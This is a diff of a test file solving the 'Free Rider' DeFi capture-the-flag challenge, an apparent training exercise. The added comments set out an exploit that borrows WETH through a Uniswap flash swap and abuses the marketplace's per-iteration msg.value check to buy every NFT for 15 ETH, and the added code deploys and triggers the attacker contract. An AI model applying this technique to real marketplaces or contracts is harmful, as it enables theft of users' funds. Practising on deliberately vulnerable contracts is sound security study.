@@ -108,19 +108,46 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
+
+
         /** CODE YOUR EXPLOIT HERE */
         // Solution : 
-        //1. deploy my own NFT collection with Ids from 0 to 5
-        //2. create offers on the marketplace with price of 0.01 ETH for each Ids
-        //3. because the marketplace do not separate offers by NFT address, this will write over the price of the initially offered one
-        //4. then I can buy these NFT myself for 0.01 ETH each
-        //5. I can then transfer them to the buyer contract
-       
-        MY_PRICE = ethers.utils.parseEther('0.01');
+        //1. Make a WETH flashswap with the pair contract
+        //2. Redeem the WETH for ETH
+        //3. set msg.value to 15 ETH in the buyMany function and buy all the NFTs
+        //4. Because the marketplace check the msg.value on every iteration rather than having a total value decreased on each buys, I can buy all the NFTs for 15 ETH
+        //5. I send the NFTs to the buyer contract
+        //6. I receive the 45 ETH payout
+        //7. I pay back the flashswap taking into account the fees
 
-        await this.marketplace.connect(attacker).buyMany(
-                []
-            );
+        console.log("attack address : " + attacker.address);
+        console.log("deployer address : " + deployer.address);
+        console.log("buyer address : " + buyer.address);
+        console.log("buyer contract address : " + this.buyerContract.address);
+
+        console.log("weth address : " + this.weth.address);
+        console.log("token address : " + this.token.address);
+        console.log("uniswap factory address : " + this.uniswapFactory.address);
+        console.log("uniswap router address : " + this.uniswapRouter.address);
+        console.log("uniswap pair address : " + this.uniswapPair.address);
+        console.log("marketplace address : " + this.marketplace.address);
+        console.log("nft address : " + this.nft.address);
+
+        //deploy the UniV2FlashSwap contract
+        //address _factory, address _weth, address _token, address _marketplace, address _nft
+        this.flashSwap = await (await ethers.getContractFactory('UniV2FlashSwap', attacker)).deploy(
+            this.uniswapFactory.address,
+            this.weth.address,
+            this.token.address,
+            this.marketplace.address,
+            this.nft.address,
+            this.buyerContract.address
+        );
+        await this.flashSwap.connect(attacker).flashSwap(
+            ethers.utils.parseEther("15"),
+            [0, 1, 2, 3, 4, 5]
+        );
+
     });
 
     after(async function () {
